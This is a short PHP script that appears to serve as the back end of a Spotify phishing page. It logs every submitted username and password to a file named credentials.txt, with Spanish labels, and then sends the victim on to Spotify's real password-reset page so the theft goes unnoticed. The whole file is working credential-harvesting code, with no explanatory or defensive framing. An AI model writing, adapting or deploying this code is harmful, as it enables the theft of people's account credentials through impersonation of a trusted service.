<?php

file_put_contents("credentials.txt", "[+] Spotify -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.spotify.com/us/password-reset/');
exit();
?>
